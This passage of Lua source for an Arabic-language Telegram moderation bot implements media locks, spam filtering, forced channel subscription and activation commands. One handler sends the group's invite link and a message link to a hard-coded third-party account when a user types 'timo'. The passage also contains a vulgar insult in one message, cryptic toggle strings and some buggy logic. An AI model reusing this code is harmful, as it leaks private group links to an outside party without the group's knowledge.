chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " ♤ عذرا  ⇦♤{[@"..data.username_.."]}\n ♤ عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " ♤ عذرا  ⇦♤{["..data.first_name_.."](T.ME/eLmLoK0)}\n ♤ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ♤ عذرا  ⇦♤{[@"..data.username_.."]}\n ♤ عذرا تم منع الصوره \n" ) 
else
send(msg.chat_id_,0," ♤ عذرا  ⇦♤{["..data.first_name_.."](T.ME/eLmLoK0)}\n ♤ عذرا تم منع الصوره \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ♤ عذرا  ⇦♤{[@"..data.username_.."]}\n ♤ عذرا تم منع المتحركه \n") 
else
send(msg.chat_id_,0," ♤ عذرا  ⇦♤{["..data.first_name_.."](T.ME/eLmLoK0)}\n ♤ عذرا تم منع المتحركه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
-------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database :get(bot_id ..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤  لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database :get(bot_id ..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ♤  عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database :get(bot_id ..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' ♤  عدد اعضاء الكروب قليله يرجى جمع >> {'..(database :get(bot_id ..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database :sismember(bot_id ..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ♤ الـجـروب مـفعـل مـن قبـل')
else
sendText(msg.chat_id_,'\n ♤ مـن قبـل ⇔ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n  ♤ تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database :sadd(bot_id ..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\n ♤ تـم تـشغـيل الـبوت فـي الـجـروب جـديد'..
'\n  ♤ بواسطة {『'..Name..'』}'..
'\n  ♤ ايدي الجروب {'..IdChat..'}'..
'\n  ♤ اسم الجروب {['..NameChat..']}'..
'\n  ♤ الرابط {['..LinkGp..']}'
sendText(SUDO,Text,0,'md')
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database :get(bot_id ..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤  لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database :get(bot_id ..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database :sismember(bot_id ..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ♤ الـبوت مـعطـل مـن قبـل')
else
sendText(msg.chat_id_,'\n ♤ مـن قبـل ⇔ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ♤ تـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database :srem(bot_id ..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\n تـم تـعـطيل الـبوت مـن الـجـروب ♤ '..
'\n ♤ بواسطة {『'..Name..'』}'..
'\n ♤ ايدي الجروب {'..IdChat..'}'..
'\n ♤ اسم الجروب {['..NameChat..']}'..
'\n ♤ الرابط {['..LinkGp..']}'
sendText(SUDO,Text,0,'md')
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not Sudo(msg) and not database :get(bot_id ..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database :get(bot_id ..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤  لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database :get(bot_id ..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ♤  عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database :get(bot_id ..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' ♤  عدد اعضاء الكروب قليله يرجى جمع ⇉ {'..(database :get(bot_id ..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
if database :sismember(bot_id ..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ♤ الـجـروب مـفعـل مـن قبـل')
else
sendText(msg.chat_id_,'\n ♤ مـن قبـل ⇔ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ♤ تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database :sadd(bot_id ..'Chek:Groups',msg.chat_id_)  
database :sadd(bot_id ..'CoSu'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\n ♤ تـم تـشغـيل الـبوت فـي الـجـروب جـديد'..
'\n ♤ بواسطة {『'..Name..'』}'..
'\n ♤ ايدي الجروب {'..IdChat..'}'..
'\n ♤ اسم الجروب {['..NameChat..']}'..
'\n ♤ الرابط {['..LinkGp..']}'
sendText(SUDO,Text,0,'md')
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end


if text ==("تفعيل") and Sudo(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_," ") 
else
send(msg.chat_id_, msg.id_," ♤ تمت ترقيه ❮ "..num2.." ❯ من الادمنيه") 
end
end,nil)   
end
if text and text:match("^ضع عدد الاعضاء (%d+)$") and Devban(msg) then
local Num = text:match("ضع عدد الاعضاء (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,' ♤ تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  ⇉ {'..Num..'} عضو')
end

if text and text:match("^المطور$") or text and text:match("^مطور$") or text and text:match("^الدعم$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
sendText(SUDO,"♤هناك من بحاجه الى مساعده \n♤الشخص  {"..Name.."}\n♤اسم الجروب {"..NameChat.."}\n♤ايدي الجروب {`"..msg.chat_id_.."`}\n♤رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^تيمو$") or text and text:match("^مبرمج تيمو$") or text and text:match("^timo$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local chatid = msg.chat_id_:gsub("-100","") 
local msg_id = msg.id_/2097152/0.5
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
sendText(2002118176,"♤ حضرت المبرمج تيمو الحق عاوزينك \n♤ الشخص  {"..Name.."}\n♤ اسم الجروب {"..NameChat.."}\n♤ ايدي الجروب { `"..msg.chat_id_.."` }\n♤ رابط الجروب \n [ "..LinkGroup.." ]\n♤ رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
-------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(bot_id) then 
database:srem(bot_id.."Chek:Groups", msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp)
 local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","")
 local Name1 = Name1:gsub("{","")
 local Name1 = Name1:gsub("}","")
 local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"")
 local NameChat = NameChat:gsub("'","")
 local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","")
sendText(SUDO," ♤ تم طرب البوت بواسطه ابن المتناكه الشرمطه دا \n\n ♤ بواسطة  {"..Name.."}\n ♤ اسم الجروب {"..NameChat.."}\n ♤ ايدي الجروب {`"..msg.chat_id_.."`}\n ♤ رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end
-------------------------------------------------------------------------------------------------------------
if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ♤ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ♤ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "مسح رساله الاشتراك " and DevSoFi(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ♤ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ♤$") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ♤ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري" and DevSoFi(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," ♤ الاشتراك الاجباري مفعل \n ♤ على القناة  ⇦♤["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," ♤ اهلا عزيزي المطور \n ♤ ارسل الان معرف قناتك")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" and DevSoFi(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ♤ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري " and DevSoFi(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ♤ تم تفعيل الاشتراك الاجباري \n ♤ على القناة  ⇦♤["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " ♤ لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "++-+++" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' ♤ تم تفعيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "+-+-+-+-+&--" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' ♤ تم تعطيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","❌")
end
if text == "حاله الالعاب" and Constructor(msg) then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الالعاب هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الالعاب مفعله\nاذا كانت {❌} الالعاب معطله")
end
function bnnaGet(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end

if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
if text and text:match("^كتم اسم (.*)$") and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local BlNe = text:match("^كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, ' ♤ تم كتم الاسم '..BlNe)
database:sadd(bot_id.."DRAGON:blocname"..msg.chat_id_, BlNe)
end

if text and text:match("^الغاء كتم اسم (.*)$") and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local delBn = text:match("^الغاء كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, ' ♤ تم الغاء كتم الاسم '..delBn)
database:srem(bot_id.."DRAGON:blocname"..msg.chat_id_, delBn)
end

if text == "مسح الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
database:del(bot_id.."DRAGON:blocname"..msg.chat_id_)
texts = " ♤ تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
if text == "الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local All_name = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_)
t = "\n ♤ قائمة الاسماء المكتومه \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = " ♤ لا يوجد اسماء مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
